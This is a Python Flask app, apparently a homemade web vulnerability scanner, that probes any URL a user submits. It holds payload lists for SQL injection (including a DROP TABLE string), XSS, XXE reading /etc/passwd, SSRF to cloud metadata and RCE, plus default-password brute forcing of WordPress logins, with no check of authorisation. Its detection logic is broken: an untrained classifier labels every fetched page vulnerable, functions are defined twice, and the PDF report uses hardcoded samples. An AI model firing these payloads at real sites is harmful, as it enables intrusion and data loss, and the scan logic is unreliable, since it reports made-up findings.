from flask import Flask, render_template, request, redirect, url_for, make_response
import requests
import time
import os
import joblib
from transformers import AutoTokenizer, TFAutoModelForSequenceClassification
import tensorflow as tf
import numpy as np
import html
from datetime import datetime
import pdfkit
import aiohttp
import asyncio

# Ensure TensorFlow uses memory on-demand
gpus = tf.config.experimental.list_physical_devices('GPU')
if gpus:
    for gpu in gpus:
        tf.config.experimental.set_memory_growth(gpu, True)

app = Flask(__name__)

# Initialize the tokenizer and model globally for vulnerability classification
tokenizer = AutoTokenizer.from_pretrained("microsoft/codebert-base")
model = TFAutoModelForSequenceClassification.from_pretrained("microsoft/codebert-base")

# Load the anomaly detection model
model_file = './anomaly_detection_model.joblib'
vectorizer, anomaly_model = joblib.load(model_file)

# List of common paths to check for vulnerabilities and their descriptions (OWASP top 10)
vulnerability_checks = {
    'wp-admin/install.php': "WordPress installation script is accessible.",
    'wp-login.php': "WordPress login page is exposed.",
    'wp-content/debug.log': "Debug log file is accessible.",
    'wp-json/wp/v2/users': "REST API user enumeration might be possible.",
    '.env': "Environment file may expose sensitive configuration information.",
    'xmlrpc.php': "XML-RPC interface could allow DDoS or brute-force attacks.",
    '.git/': "Git directory exposure could reveal sensitive information or source code.",
    'phpinfo.php': "phpinfo() file could expose server configuration details.",
    'wp-config.php.bak': "Backup of wp-config file could contain sensitive information.",
    'backup.sql': "SQL backup file might expose database contents."
}

# Vulnerability payloads based on OWASP Top 10 categories
sql_injection_tests = ["'", "' OR '1'='1", "'; DROP TABLE users; --", "' OR '1'='2", "admin' --", "' UNION SELECT NULL, NULL"]
xss_tests = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS') />", "<div onmouseover='alert(\"XSS\")'>Hover</div>"]
xxe_payloads = ["<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"]
ssrf_payloads = ['http://localhost', 'http://127.0.0.1', 'http://169.254.169.254/latest/meta-data/']
rce_payloads = ['phpinfo()', 'system("ls")', 'system("cat /etc/passwd")']

login_tests = [
    ('admin', 'password'),  
    ('admin', 'admin'),  
    ('root', 'password'),  
    ('test', 'test'),  
    ('admin', '123456'),  
    ('user', 'password'),  
    ('administrator', 'admin'),  
    ('admin', 'pass1234'),  
    ('guest', 'guest'),  
    ('root', 'root')
]

xss_payloads = [
    "<script>alert('XSS')</script>",                        
    "<img src=x onerror=alert('XSS') />",                   
    "<svg/onload=alert('XSS')>",                            
    "<body onload=alert('XSS')>",                           
    "';alert('XSS');//",                                    
    "<iframe src=javascript:alert('XSS')>",                 
    "<input type='text' onfocus='alert(1)' autofocus>",     
    "<div onmouseover='alert(\"XSS\")'>Hover me!</div>",    
    "javascript:alert('XSS')",                              
    "'';!--\"<XSS>=&{()}",                                  
]

# Function to classify vulnerability using the pre-trained model
def classify_vulnerability(text):
    inputs = tokenizer(text, return_tensors="tf", truncation=True, padding=True, max_length=512)
    outputs = model(inputs)
    prediction = tf.nn.softmax(outputs.logits, axis=-1)
    return prediction.numpy()[0]

# Function to detect anomalies in server responses
def detect_anomalies(responses):
    X = vectorizer.transform(responses)
    anomalies = anomaly_model.predict(X)
    return anomalies

# Add asynchronous fetching with aiohttp
async def fetch_url(session, url):
    async with session.get(url) as response:
        return await response.text()

async def scan_urls(urls):
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_url(session, url) for url in urls]
        return await asyncio.gather(*tasks)

# Function to check if a URL is vulnerable
def check_vulnerability(url, description):
    result = ""
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            content = response.text
            vulnerability_scores = classify_vulnerability(content)
            vulnerability_type = ["SQL Injection", "XSS", "CSRF", "RCE", "Other"][np.argmax(vulnerability_scores)]
            confidence = np.max(vulnerability_scores)
            result = f"[VULNERABLE] {url} - {description} (Type: {vulnerability_type}, Confidence: {confidence:.2f})"
        elif response.status_code == 403:
            result = f"[INFO] Access denied at: {url} (403 Forbidden)"
        elif response.status_code == 404:
            result = f"[INFO] Not found: {url} (404 Not Found)"
        else:
            result = f"[INFO] Unexpected status code {response.status_code} at: {url}"
    except requests.RequestException as e:
        result = f"[ERROR] Error checking {url}: {e}"
    
    return result

# Function to log vulnerabilities to an HTML file
def log_vulnerability(url, message, level):
    with open("vulnerability_report.html", "a") as log_file:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        css_class = level.lower()
        escaped_message = html.escape(message)
        log_file.write(f"<tr class='{css_class}'><td>{timestamp}</td><td>{level}</td><td>{url}</td><td>{escaped_message}</td></tr>\n")
# def check_input_vulnerabilities(url):
#     for test in sql_injection_tests:
#         try:
#             response = requests.get(f"{url}?test={test}", timeout=10)
#             if "SQL" in response.text or "syntax" in response.text:
#                 result = f"[VULNERABLE] SQL Injection possible at: {url} with payload: {test}"
#                 log_vulnerability(url, f"SQL Injection possible with payload: {test}", "CRITICAL")
#                 print(result)
#         except requests.RequestException as e:
#             result = f"[ERROR] Error checking for SQL Injection at {url}: {e}"
#             log_vulnerability(url, f"SQL Injection check error: {e}", "ERROR")
#             print(result)

#     for test in xss_tests:
#         try:
#             response = requests.get(f"{url}?test={test}", timeout=10)
#             if "<script>" in response.text or "alert('XSS')" in response.text:
#                 escaped_test = html.escape(test)
#                 result = f"[VULNERABLE] XSS possible at: {url} with payload: {escaped_test}"
#                 log_vulnerability(url, f"XSS possible with payload: {escaped_test}", "CRITICAL")
#                 print(result)
#         except requests.RequestException as e:
#             result = f"[ERROR] Error checking for XSS at {url}: {e}"
#             log_vulnerability(url, f"XSS check error: {e}", "ERROR")
#             print(result)
# Enhanced function to check for vulnerabilities
def check_vulnerability(url, description):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            content = response.text
            # Use the pre-trained model to classify the vulnerability
            vulnerability_scores = classify_vulnerability(content)
            vulnerability_type = ["SQL Injection", "XSS", "CSRF", "RCE", "Other"][np.argmax(vulnerability_scores)]
            confidence = np.max(vulnerability_scores)

            # If the confidence is below a certain threshold, mark as safe
            if confidence < 0.5:
                result = f"[SAFE] {url} - No significant vulnerabilities detected. (Confidence: {confidence:.2f})"
                log_vulnerability(url, f"No significant vulnerabilities detected. (Confidence: {confidence:.2f})", "SAFE")
            else:
                result = f"[VULNERABLE] {url} - {description} (Type: {vulnerability_type}, Confidence: {confidence:.2f})"
                log_vulnerability(url, f"{description} (Type: {vulnerability_type}, Confidence: {confidence:.2f})", "CRITICAL")
        elif response.status_code == 403:
            result = f"[INFO] Access denied at: {url} (403 Forbidden)"
            log_vulnerability(url, "Access denied (403 Forbidden)", "INFO")
        elif response.status_code == 404:
            result = f"[INFO] Not found: {url} (404 Not Found)"
            log_vulnerability(url, "Not found (404 Not Found)", "INFO")
        else:
            result = f"[INFO] Unexpected status code {response.status_code} at: {url}"
            log_vulnerability(url, f"Unexpected status code {response.status_code}", "INFO")
        print(result)
    except requests.RequestException as e:
        result = f"[ERROR] Error checking {url}: {e}"
        log_vulnerability(url, f"Request error: {e}", "ERROR")
        print(result)

# Function to check for SQL injection vulnerabilities
def check_sql_injection(url):
    results = []
    for test in sql_injection_tests:
        try:
            response = requests.get(f"{url}?test={test}", timeout=10)
            # Check for SQL error indicators in the response
            if "SQL" in response.text or "syntax" in response.text:
                result = f"[VULNERABLE] SQL Injection possible at: {url} with payload: {test}"
                results.append(result)  # Only append if the payload is successful
        except requests.RequestException as e:
            print(f"Error during SQL Injection check: {e}")
    return results

# Function to check for XSS vulnerabilities
def check_xss(url):
    results = []
    
    # Loop through each XSS payload for testing
    for payload in xss_payloads:
        try:
            print(f"Testing XSS on: {url} with payload: {payload}")  # Debug log
            
            # Send the XSS payload in the query string
            response = requests.get(f"{url}?test={payload}", timeout=10)
            
            # Check if the payload is reflected in the response (even partially)
            if payload in response.text:
                escaped_payload = html.escape(payload)
                result = f"[VULNERABLE] Reflected XSS possible at: {url} with payload: {escaped_payload}"
                results.append(result)
                log_vulnerability(url, f"Reflected XSS possible with payload: {escaped_payload}", "CRITICAL")
            else:
                # Check for partial reflection (obfuscated XSS payloads)
                for i in range(len(payload)):
                    if payload[:i] in response.text:
                        result = f"[POTENTIALLY VULNERABLE] Partial XSS reflection detected at: {url} with payload: {payload}"
                        results.append(result)
                        log_vulnerability(url, f"Partial XSS reflection detected with payload: {payload}", "WARNING")
                        break
                else:
                    print(f"No XSS vulnerability detected at: {url} with payload: {payload}")
        
        except requests.RequestException as e:
            print(f"Error during XSS check at {url}: {e}")  # Log the exception for debugging
    
    return results

def check_xss(url):
    results = []
    for test in xss_tests:
        try:
            response = requests.get(f"{url}?test={test}", timeout=10)
            if "<script>" in response.text or "alert('XSS')" in response.text:
                escaped_test = html.escape(test)
                result = f"[VULNERABLE] XSS possible at: {url} with payload: {escaped_test}"
                results.append(result)  # Only append if XSS payload succeeds
        except requests.RequestException as e:
            print(f"Error during XSS check: {e}")
    return results


# Function to check for XXE vulnerabilities
def check_xxe(url):
    results = []
    for test in xxe_payloads:
        try:
            print(f"Testing XXE on: {url} with payload: {test}")  # Debug log
            # Send the payload using a POST request with XML content type
            response = requests.post(url, data=test, headers={'Content-Type': 'application/xml'}, timeout=10)

            # Check for typical XXE exploitation evidence (e.g., presence of '/etc/passwd')
            if "root" in response.text or "/etc/passwd" in response.text:
                escaped_test = html.escape(test)
                result = f"[VULNERABLE] XXE possible at: {url} with payload: {escaped_test}"
                results.append(result)  # Append only if XXE vulnerability is detected
                log_vulnerability(url, f"XXE possible with payload: {escaped_test}", "CRITICAL")
            else:
                print(f"No XXE vulnerability detected at: {url} with payload: {test}")

        except requests.RequestException as e:
            print(f"Error during XXE check at {url}: {e}")  # Log the exception for debugging

    return results


# Function to check for SSRF vulnerabilities
def check_ssrf(url):
    results = []
    for payload in ssrf_payloads:
        try:
            print(f"Testing SSRF on: {url} with payload: {payload}")  # Debug log
            response = requests.get(f"{url}?test={payload}", timeout=10)
            
            # Only append if SSRF vulnerability is detected (status 200 might indicate a success)
            if response.status_code == 200:
                result = f"[VULNERABLE] SSRF possible at: {url} with payload: {payload}"
                log_vulnerability(url, f"SSRF possible with payload: {payload}", "CRITICAL")
                results.append(result)
            else:
                print(f"No SSRF vulnerability detected at: {url} with payload: {payload}")
                
        except requests.RequestException as e:
            print(f"Error during SSRF check at {url}: {e}")  # Log the exception

    return results

# Function to check for RCE vulnerabilities
def check_rce(url):
    results = []
    for payload in rce_payloads:
        try:
            print(f"Testing RCE on: {url} with payload: {payload}")  # Debug log
            response = requests.get(f"{url}?cmd={payload}", timeout=10)
            
            # Only append if RCE vulnerability is detected (look for common indicators)
            if "phpinfo" in response.text or "ls" in response.text:
                escaped_payload = html.escape(payload)
                result = f"[VULNERABLE] RCE possible at: {url} with payload: {escaped_payload}"
                log_vulnerability(url, f"RCE possible with payload: {escaped_payload}", "CRITICAL")
                results.append(result)
            else:
                print(f"No RCE vulnerability detected at: {url} with payload: {payload}")
                
        except requests.RequestException as e:
            print(f"Error during RCE check at {url}: {e}")  # Log the exception

    return results




# Function to perform brute force login attempts
def brute_force_login(url, login_tests):
    results = []
    login_url = url + 'wp-login.php'  # Example login page, adjust if needed
    
    for username, password in login_tests:
        try:
            # Simulate a login attempt by sending POST request
            response = requests.post(login_url, data={'log': username, 'pwd': password}, timeout=10)
            
            # Check if brute force succeeded (login page reloads without error)
            if response.status_code == 200 and "wp-login.php" in response.url:
                result = f"[VULNERABLE] Brute force succeeded with username '{username}' and password '{password}' at {login_url}"
                log_vulnerability(login_url, f"Brute force login succeeded with username '{username}' and password '{password}'", "CRITICAL")
                results.append(result)
            else:
                print(f"Brute force login failed for username '{username}' and password '{password}'")

        except requests.RequestException as e:
            print(f"Error during brute force attempt at {login_url}: {e}")  # Log the exception
    
    return results

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        return redirect(url_for('scan_report', url=url))
    return render_template('index.html')

# @app.route('/report', methods=['GET'])
# def scan_report():
#     url = request.args.get('url')
#     results = []
#     responses = []

#     # Build the URLs to check for vulnerabilities
#     urls_to_check = [url + path for path in vulnerability_checks.keys()]

#     # Use asyncio to perform the asynchronous fetching of URLs
#     try:
#         loop = asyncio.new_event_loop()
#         asyncio.set_event_loop(loop)
#         fetched_responses = loop.run_until_complete(scan_urls(urls_to_check))
#     except Exception as e:
#         print(f"Error while fetching URLs asynchronously: {e}")
#         fetched_responses = []

#     # Analyze responses and perform vulnerability checks
#     for full_url, response in zip(urls_to_check, fetched_responses):
#         if response is not None:
#             try:
#                 # Perform the vulnerability classification on the response content
#                 vulnerability_scores = classify_vulnerability(response)
#                 vulnerability_type = ["SQL Injection", "XSS", "CSRF", "RCE", "Other"][np.argmax(vulnerability_scores)]
#                 confidence = np.max(vulnerability_scores)
#                 result = f"[VULNERABLE] {full_url} - {vulnerability_checks[full_url.replace(url, '')]} (Type: {vulnerability_type}, Confidence: {confidence:.2f})"
#                 timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
#                 level = "CRITICAL" if "VULNERABLE" in result else "INFO"
#                 results.append((timestamp, level, full_url, result))
#             except Exception as e:
#                 # Capture error during vulnerability analysis
#                 results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", full_url, f"Error during analysis: {e}"))
#         else:
#             # If the response is None, it means the request failed
#             results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", full_url, "Failed to fetch the URL"))

#     # Additional vulnerability checks for SQL Injection, XSS, etc.
#     for path, description in vulnerability_checks.items():
#         full_url = url + path
#         try:
#             sql_results = check_sql_injection(full_url)
#             results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in sql_results if "[VULNERABLE]" in res])
#         except Exception as e:
#             log_vulnerability(full_url, f"Error during SQL Injection check: {e}", "ERROR")
#             results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", full_url, f"Error during SQL Injection check: {e}"))

#         try:
#             xss_results = check_xss(full_url)
#             results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in xss_results if "[VULNERABLE]" in res])
#         except Exception as e:
#             log_vulnerability(full_url, f"Error during XSS check: {e}", "ERROR")
#             results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", full_url, f"Error during XSS check: {e}"))

#         try:
#             xxe_results = check_xxe(full_url)
#             results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in xxe_results if "[VULNERABLE]" in res])
#         except Exception as e:
#             log_vulnerability(full_url, f"Error during XXE check: {e}", "ERROR")
#             results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", full_url, f"Error during XXE check: {e}"))

#         try:
#             ssrf_results = check_ssrf(full_url)
#             results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in ssrf_results if "[VULNERABLE]" in res])
#         except Exception as e:
#             log_vulnerability(full_url, f"Error during SSRF check: {e}", "ERROR")
#             results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", full_url, f"Error during SSRF check: {e}"))

#         try:
#             rce_results = check_rce(full_url)
#             results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in rce_results if "[VULNERABLE]" in res])
#         except Exception as e:
#             log_vulnerability(full_url, f"Error during RCE check: {e}", "ERROR")
#             results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", full_url, f"Error during RCE check: {e}"))

#     # Perform brute force login attempts (only append vulnerable results)
#     try:
#         brute_force_results = brute_force_login(url, login_tests)
#         results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", url, res) for res in brute_force_results if "[VULNERABLE]" in res])
#     except Exception as e:
#         log_vulnerability(url, f"Error during brute force check: {e}", "ERROR")
#         results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", url, f"Error during brute force check: {e}"))

#     # Pass all results (including failed checks) to the template
#     return render_template('report.html', url=url, results=results)

@app.route('/report', methods=['GET'])
def scan_report():
    url = request.args.get('url')
    results = []
    responses = []

    # Build the URLs to check for vulnerabilities
    urls_to_check = [url + path for path in vulnerability_checks.keys()]

    # Use asyncio to perform the asynchronous fetching of URLs
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        fetched_responses = loop.run_until_complete(scan_urls(urls_to_check))
    except Exception as e:
        print(f"Error while fetching URLs asynchronously: {e}")
        fetched_responses = []

    # Analyze responses and perform vulnerability checks
    for full_url, response in zip(urls_to_check, fetched_responses):
        if response is not None:
            try:
                # Perform the vulnerability classification on the response content
                vulnerability_scores = classify_vulnerability(response)
                vulnerability_type = ["SQL Injection", "XSS", "CSRF", "RCE", "Other"][np.argmax(vulnerability_scores)]
                confidence = np.max(vulnerability_scores)
                result = f"[VULNERABLE] {full_url} - {vulnerability_checks[full_url.replace(url, '')]} (Type: {vulnerability_type}, Confidence: {confidence:.2f})"
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                level = "CRITICAL" if "VULNERABLE" in result else "INFO"
                results.append((timestamp, level, full_url, result))
            except Exception as e:
                # Capture error during vulnerability analysis
                results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", full_url, f"Error during analysis: {e}"))
        else:
            # If the response is None, it means the request failed
            results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "FAILED", full_url, "Failed to fetch the URL"))

    # Additional vulnerability checks for SQL Injection, XSS, etc.
    for path, description in vulnerability_checks.items():
        full_url = url + path
        try:
            sql_results = check_sql_injection(full_url)
            results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in sql_results if "[VULNERABLE]" in res])
        except Exception as e:
            log_vulnerability(full_url, f"Error during SQL Injection check: {e}", "ERROR")
            results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", full_url, f"Error during SQL Injection check: {e}"))

        try:
            xss_results = check_xss(full_url)
            results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in xss_results if "[VULNERABLE]" in res])
        except Exception as e:
            log_vulnerability(full_url, f"Error during XSS check: {e}", "ERROR")
            results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", full_url, f"Error during XSS check: {e}"))

        try:
            xxe_results = check_xxe(full_url)
            results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in xxe_results if "[VULNERABLE]" in res])
        except Exception as e:
            log_vulnerability(full_url, f"Error during XXE check: {e}", "ERROR")
            results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", full_url, f"Error during XXE check: {e}"))

        try:
            ssrf_results = check_ssrf(full_url)
            results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in ssrf_results if "[VULNERABLE]" in res])
        except Exception as e:
            log_vulnerability(full_url, f"Error during SSRF check: {e}", "ERROR")
            results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", full_url, f"Error during SSRF check: {e}"))

        try:
            rce_results = check_rce(full_url)
            results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in rce_results if "[VULNERABLE]" in res])
        except Exception as e:
            log_vulnerability(full_url, f"Error during RCE check: {e}", "ERROR")
            results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", full_url, f"Error during RCE check: {e}"))

    # Perform brute force login attempts (only append vulnerable results)
    try:
        brute_force_results = brute_force_login(url, login_tests)
        results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", url, res) for res in brute_force_results if "[VULNERABLE]" in res])
    except Exception as e:
        log_vulnerability(url, f"Error during brute force check: {e}", "ERROR")
        results.append((datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "ERROR", url, f"Error during brute force check: {e}"))

    # Pass all results (including failed checks) to the template
    return render_template('report.html', url=url, results=results)

# def scan_report():
#     url = request.args.get('url')
#     results = []
#     responses = []

#     # Build the URLs to check for vulnerabilities
#     urls_to_check = [url + path for path in vulnerability_checks.keys()]

#     # Perform vulnerability scans for each path
#     for path, description in vulnerability_checks.items():
#         full_url = url + path
#         try:
#             result = check_vulnerability(full_url, description)
#         except Exception as e:
#             result = f"[ERROR] Could not check {full_url} for vulnerabilities: {e}"
#             log_vulnerability(full_url, f"Error during vulnerability check: {e}", "ERROR")
        
#         # Only append if the check returns a vulnerable result
#         if "[VULNERABLE]" in result:
#             timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
#             level = "CRITICAL" if "VULNERABLE" in result else "INFO"
#             message = result
#             results.append((timestamp, level, full_url, message))

#         # Perform SQL Injection, XSS, XXE, SSRF, RCE tests
#         try:
#             sql_results = check_sql_injection(full_url)
#             results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in sql_results if "[VULNERABLE]" in res])
#         except Exception as e:
#             log_vulnerability(full_url, f"Error during SQL Injection check: {e}", "ERROR")

#         try:
#             xss_results = check_xss(full_url)
#             results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in xss_results if "[VULNERABLE]" in res])
#         except Exception as e:
#             log_vulnerability(full_url, f"Error during XSS check: {e}", "ERROR")
        
#         try:
#             xxe_results = check_xxe(full_url)
#             results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in xxe_results if "[VULNERABLE]" in res])
#         except Exception as e:
#             log_vulnerability(full_url, f"Error during XXE check: {e}", "ERROR")
        
#         try:
#             ssrf_results = check_ssrf(full_url)
#             results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in ssrf_results if "[VULNERABLE]" in res])
#         except Exception as e:
#             log_vulnerability(full_url, f"Error during SSRF check: {e}", "ERROR")
        
#         try:
#             rce_results = check_rce(full_url)
#             results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", full_url, res) for res in rce_results if "[VULNERABLE]" in res])
#         except Exception as e:
#             log_vulnerability(full_url, f"Error during RCE check: {e}", "ERROR")

#         # Collect responses for anomaly detection
#         try:
#             response = requests.get(full_url, timeout=10)
#             responses.append(response.text)
#         except requests.RequestException:
#             responses.append("")  # Add an empty string if request fails
#         time.sleep(1)  # To avoid overloading the server

#     # Perform brute force login attempts (only append vulnerable results)
#     try:
#         brute_force_results = brute_force_login(url, login_tests)
#         results.extend([(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "CRITICAL", url, res) for res in brute_force_results if "[VULNERABLE]" in res])
#     except Exception as e:
#         log_vulnerability(url, f"Error during brute force check: {e}", "ERROR")

#     # Detect anomalies in the responses
#     if responses:
#         try:
#             anomalies = detect_anomalies(responses)
#             for i, is_anomaly in enumerate(anomalies):
#                 if is_anomaly == -1:  # -1 indicates an anomaly
#                     results[i] = (results[i][0], results[i][1], results[i][2], results[i][3] + " [ANOMALOUS RESPONSE DETECTED]")
#         except Exception as e:
#             log_vulnerability(url, f"Error during anomaly detection: {e}", "ERROR")

#     # Pass only vulnerable results to the template
#     return render_template('report.html', url=url, results=results)


# PDF generation route
@app.route('/download_pdf', methods=['GET'])
def download_pdf():
    url = request.args.get('url')
    
    # Sample results data, replace with actual results from the scan
    results = [
        ("2024-09-04 14:43:28", "INFO", "http://example.com", "Sample Message: No vulnerabilities detected."),
        ("2024-09-04 14:43:29", "CRITICAL", "http://example.com/wp-login.php", "Sample Message: Vulnerability Detected.")
    ]

    rendered = render_template('report.html', url=url, results=results)

    # Convert the HTML to PDF
    pdf = pdfkit.from_string(rendered, False)

    # Send the PDF as a downloadable file
    response = make_response(pdf)
    response.headers['Content-Type'] = 'application/pdf'
    response.headers['Content-Disposition'] = 'attachment; filename=scan_report.pdf'

    return response

if __name__ == "__main__":
    app.run(debug=True)
